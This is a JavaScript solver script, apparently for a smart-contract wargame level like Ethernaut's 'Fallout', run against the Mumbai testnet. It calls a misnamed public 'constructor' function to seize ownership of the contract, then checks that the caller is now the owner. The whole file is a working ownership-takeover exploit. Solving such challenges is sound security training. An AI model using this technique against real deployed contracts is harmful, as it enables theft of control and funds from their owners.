const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[],"name":"Fal1out","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0x6fab5ddf"},{"inputs":[],"name":"allocate","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xabaa9916"},{"inputs":[{"internalType":"address","name":"allocator","type":"address"}],"name":"allocatorBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xffd40b56"},{"inputs":[],"name":"collectAllocations","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x8aa96f38"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[{"internalType":"address payable","name":"allocator","type":"address"}],"name":"sendAllocation","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xa2dea26f"}];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new web3.eth.Contract(contractAbi, contractAddress);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);

    if (await isSolved(account, contract)) {
        console.log('The challenge has already been solved.');
        return;
    }

    console.log('calling fake constructor to gain ownership');
    const tx = await contract.methods.Fal1out();
    const txOpt = {
        to: contractAddress,
        data: tx.encodeABI(),
        gas: await tx.estimateGas({from: account.address}),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedTx = await web3.eth.accounts.signTransaction(txOpt, privateKey);
    await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    console.log('checking if contract is owned...');
    if (await isSolved(account, contract)) {
        console.log('Solved!');
    } else {
        console.error('The challenge has not been solved. Something unexpected happened.');
    }
}

async function isSolved(account, contract) {
    const owner = await contract.methods.owner().call();
    return owner === account.address;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('Please provide a private key.');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('Please provide a contract address.');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
